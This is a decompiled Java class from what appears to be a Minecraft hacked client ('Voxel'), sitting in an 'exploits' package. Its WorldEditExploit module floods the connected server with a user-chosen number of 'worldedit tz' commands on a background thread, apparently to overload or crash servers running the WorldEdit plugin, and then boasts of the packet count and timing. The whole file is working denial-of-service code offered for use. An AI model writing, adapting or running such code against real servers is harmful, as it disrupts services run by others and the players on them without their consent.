package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.util.Objects;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_634;
import net.minecraft.class_746;

public class WorldEditExploit {
   public static int execute(CommandContext<FabricClientCommandSource> context) {
      int packets = (Integer)context.getArgument("packets", Integer.class);
      ((FabricClientCommandSource)context.getSource()).sendFeedback(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5WorldEditExploit&8] &7Sending exploit packets..."));
      (new Thread(() -> {
         long now = System.currentTimeMillis();

         for(int i = 0; i < packets; ++i) {
            ((class_634)Objects.requireNonNull(((FabricClientCommandSource)context.getSource()).getClient().method_1562())).method_45731("worldedit tz .VOXEL-CLIENT-TOP");
         }

         class_746 var10000 = ((FabricClientCommandSource)context.getSource()).getPlayer();
         String var10001 = "&8[&5&lVoxel&8] &8[&5WorldEditExploit&8] &7Sent &d%d&7 exploit packets &8[&6".formatted(new Object[]{packets});
         var10000.method_7353(ColorUtil.translate(var10001 + (System.currentTimeMillis() - now) + "ms&8]"), false);
      })).start();
      return 1;
   }
}
